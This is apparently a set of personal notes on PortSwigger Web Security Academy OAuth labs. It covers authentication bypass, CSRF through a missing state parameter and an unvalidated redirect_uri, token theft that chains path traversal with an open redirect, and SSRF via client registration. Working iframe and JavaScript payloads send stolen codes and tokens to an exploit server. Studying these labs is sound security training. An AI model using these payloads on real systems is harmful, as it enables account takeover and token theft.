![[OAuth.jpg]]
# Recon

- [https://portswigger.net/web-security/oauth#identifying-oauth-authentication](https://portswigger.net/web-security/oauth#identifying-oauth-authentication)
# Auth Bypass via OAuth Implicit Flow

After the client app has received the access token for a user from the OAuth service, it will retrieve information about the user from the OAuth service "user endpoint". The client app will then submit the user's email and access token to their own endpoint for authentication (the access token acts like a traditional password).

However, by changing the email parameter to another user's email, you can log into the app as any arbitrary user, essentially bypassing authentication.

![[OAuth 1.png]]
# CSRF Attack - Missing "State" Parameter

An app is allowing users to attach their social media account to their normal app account. When the clien t app submits the "Authorization Request" to the OAuth Service, the "state" parameter is not included with the request. This behaviour can be used to perform a CSRF like attack.

Go through a normal OAuth workflow and capture the "Authorization Code Grant" request via the Proxy (then drop the request - it will look like this - /oauth-linking?code=xxxx). This request can be used as the CSRF exploit to attack other users and to attach our social media account to their normal app account.

Once the payload is delivered to the victim, log into the app again using the Social Media Login function and you gain access to their account.

An example CSRF Payload (use in exploit server to host it):

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=UNUSED-CODE"></iframe>
```
# CSRF Attack - Missing Validation "redirect_uri" Parameter

The "redirect_uri" parameter is not being validated properly in the "Authorization Request". Create a CSRF exploit that contains this "Authorization Request" along with a "redirect_uri" value to a domain you control.

When the OAuth server sends back the authorization code, it will append it to the domain specified ion the "redirect_uri" and we can check in the exploit server logs to obtain another user's auth code, which can now be submitted to the original "callback" URL of the app and log into their account.

An example CSRF payload:

```html
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Now, use the stolen auth code within the client app's callback URL:

```html
https://your-lab-id.web-security-academy.net/oauth-callback?code=STOLEN-CODE
```

![[OAuth 2.png]]

# Bypassing Flawed "redirect_uri" Parameter Validation

The OAuth server is not properly validating the "redirect_uri" parameter in the client app's "Authorization Request". The domain cannot be manipulated, however, by using a path traversal vulnerability you can point the "redirect_uri" value to another location within the client's application. 

This other location in the client's app also contains an open redirection vulnerability which can be used to direct the request to an arbitrary domain like the exploit server.

Combining these 2 vulnerabilities along with a CSRF exploit, you can capture an access token (implicit grant flow is used here) that belongs to another user. And use that token to access the victim user's information. The final payload to be hosted in the exploit server:

- This will force the victim user to first visit the malicious URL then a request will be submitted to the exploit server with the access token appended to the request (the access token is sent in fragment -> \#xxxx).
- The "redirect_uri" parameters contains the traversal and open redirection vulnerability location
- Deliver the payload to the victim user and check the exploit server logs for the access token

```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
# SSRF via OpenID Dynamic Client Registration

An attacker can dynamically register a client app with the OAuth server. The registration endpoint does not require any authentication. 

There is a request in the app that looks like this, which initiates a request to the endpoint that was specified within the "logo_uri" parameter upon client registration. The contents are returned in the response as well:

- /client/{client-id}/logo

We can register a new client with the OAuth server and specify Collaborator endpoint within the "logo_uri" parameter to identify if an in-band SSRF attack is possible. Since the contents of the request are returned in the response, this is considered an in-band SSRF vulnerability and can be used to retrieve sensitive internal system information.

The following payload was injected in the body of the OAuth's service registration endpoint:

```json
{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}
```
# Stealing OAuth Access Tokens via a Proxy Page

- Link: [https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)

